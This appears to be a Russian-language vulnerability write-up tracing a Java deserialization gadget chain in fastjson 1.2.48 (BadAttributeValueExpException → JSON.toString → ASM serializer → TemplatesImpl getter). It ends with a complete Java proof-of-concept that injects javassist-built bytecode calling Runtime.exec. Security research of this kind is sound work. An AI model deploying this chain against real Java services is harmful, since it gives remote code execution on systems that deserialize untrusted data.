# Анализ запроса neo4j для пакета fastjson.1.2.48+

## Пример работы
Рассмотрим запрос 
```
    match (source:Method) where source.NAME="readObject" and source.CLASSNAME="javax.management.BadAttributeValueExpException"
    match (m1:Method{CLASSNAME:"com.alibaba.fastjson.serializer.ObjectSerializer", NAME:"write"})
    call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 12) yield path
    return * limit 1
```

Эта цепочка относится для пакета версии 1.2.48. Для начала опишу эту версиию, чтобы не повторяться в версии 1.2.83.
+ Начинается всё с вызова метода readObject:
```
javax.management.BadAttributeValueExpException.readObject()

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```
+ Нас интересует вызов метода *toString*. Вообще, запрос к neo4j вылаёт довольно длинный путь через полседнюю ветку else, однако если в System не выставлен securityManager, то можно сразу вызвать toString класса JSON.
```
com.alibaba.fastjson.JSON.toString()

    public String toString() {
        return this.toJSONString();
    }
    
```
+ Просто перекидывание на следующий метод

```
com.alibaba.fastjson.JSON.toJSONString()

    public String toJSONString() {
        SerializeWriter out = new SerializeWriter();

        String var2;
        try {
            (new JSONSerializer(out)).write(this);
            var2 = out.toString();
        } finally {
            out.close();
        }

        return var2;
    }
    
```
+ Тут нам интересен вызов *write* класса JSONSerializer. Для этого так же не нужно каких либо условий.

```
com.alibaba.fastjson.JSONSerializer.write()

    public final void write(Object object) {
        if (object == null) {
            this.out.writeNull();
        } else {
            Class<?> clazz = object.getClass();
            ObjectSerializer writer = this.getObjectWriter(clazz);

            try {
                writer.write(this, object, (Object)null, (Type)null, 0);
            } catch (IOException var5) {
                throw new JSONException(var5.getMessage(), var5);
            }
        }
    }
    
```
+ И теперь от переданного ненулевого объкта можно создать сериалайзер и вызвать у него метод *write*.

### Как это можно дальше использовать
В качестве передаваемого объекта в сериалайзер можно jsonArray. Тогда для него создастся ListSerializer, в котором повторятся операции для объектов внутри jsonArray.

```
com.alibaba.fastjson.serializer.SerializeConfig.getObjectWriter()

    private ObjectSerializer getObjectWriter(Class<?> clazz, boolean create) {
        ...
        if (create) {
            writer = this.createJavaBeanSerializer(clazz);
            this.put((Type)clazz, (ObjectSerializer)writer);
        }
        ...
    }
    
```
    
+ Если для этого объекта не нашлось какого-то готового сериалайзера, то для него будет вызван *creatingJavaBeanSerializer*

```
com.alibaba.fastjson.serializer.SerializeConfig.getObjectWriter()

    public final ObjectSerializer createJavaBeanSerializer(Class<?> clazz) {
        SerializeBeanInfo beanInfo = TypeUtils.buildBeanInfo(clazz, (Map)null, this.propertyNamingStrategy, this.fieldBased);
        return (ObjectSerializer)(beanInfo.fields.length == 0 && Iterable.class.isAssignableFrom(clazz) ? MiscCodec.instance : this.createJavaBeanSerializer(beanInfo));
    }
```
+ следующий *creatingJavaBeanSerializer*

```
com.alibaba.fastjson.serializer.SerializeConfig.getObjectWriter()

    public ObjectSerializer createJavaBeanSerializer(SerializeBeanInfo beanInfo) {
        ...
        if (asm) {
                try {
                    ObjectSerializer asmSerializer = this.createASMSerializer(beanInfo);
                    if (asmSerializer != null) {
                        return asmSerializer;
                    }
                } catch (ClassNotFoundException var17) {
                } catch (ClassFormatError var18) {
                } catch (ClassCastException var19) {
                } catch (Throwable var20) {
                    throw new JSONException("create asm serializer error, class " + clazz, var20);
                }
            }
        ...
    }
```

+ В итоге идёт создание asm фабрики.

```
com.alibaba.fastjson.serializer.ASMSerializerFactory.generateWriteMethod()

    private void generateWriteMethod(Class<?> clazz, MethodVisitor mw, FieldInfo[] getters, Context context) throws Exception {
        ...
        for(int i = 0; i < size; ++i) {
            FieldInfo property = getters[i];
            Class<?> propertyClass = property.fieldClass;
            mw.visitLdcInsn(property.name);
            mw.visitVarInsn(58, ASMSerializerFactory.Context.fieldName);
            if (propertyClass != Byte.TYPE && propertyClass != Short.TYPE && propertyClass != Integer.TYPE) {
                if (propertyClass == Long.TYPE) {
                    this._long(clazz, mw, property, context);
                } else if (propertyClass == Float.TYPE) {
                    this._float(clazz, mw, property, context);
                } else if (propertyClass == Double.TYPE) {
                    this._double(clazz, mw, property, context);
                } else if (propertyClass == Boolean.TYPE) {
                    this._int(clazz, mw, property, context, context.var("boolean"), 'Z');
                } else if (propertyClass == Character.TYPE) {
                    this._int(clazz, mw, property, context, context.var("char"), 'C');
                } else if (propertyClass == String.class) {
                    this._string(clazz, mw, property, context);
                } else if (propertyClass == BigDecimal.class) {
                    this._decimal(clazz, mw, property, context);
                } else if (List.class.isAssignableFrom(propertyClass)) {
                    this._list(clazz, mw, property, context);
                } else if (propertyClass.isEnum()) {
                    this._enum(clazz, mw, property, context);
                } else {
                    this._object(clazz, mw, property, context);
                }
            } else {
                this._int(clazz, mw, property, context, context.var(propertyClass.getName()), 'I');
            }
        }
        ...
    }
```
+ Нас не особо интересует, что из этого вызовется, так как любой метод, начинающийся с _, вызовет ещё и * _get*, вызывающий getter для класса, для которого мы создаём сериалайзер.

### Что это даёт

В качестве хранимого в массиве объекта можно использовать класс TemplatesImpl, у которого есть метод *getTransletInstance* c вызовом *newInstance*, где можно создать произвольный класс с необходимым нам конструктором. Пример эксплойта:

```
import com.alibaba.fastjson.JSONArray;
import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;


public class Test {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"gnome-calculator\");");
        clazz.addConstructor(constructor);
        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "y4tacker");
        setValue(templates, "_tfactory", null);


        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(val);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```
### Замечание
На более старших версиях такое не работает, так как в JSON классах используются другие методы для readObject: SecureObjectInputStream.

### Ссылка на оригинальную статью
https://paper.seebug.org/2055/
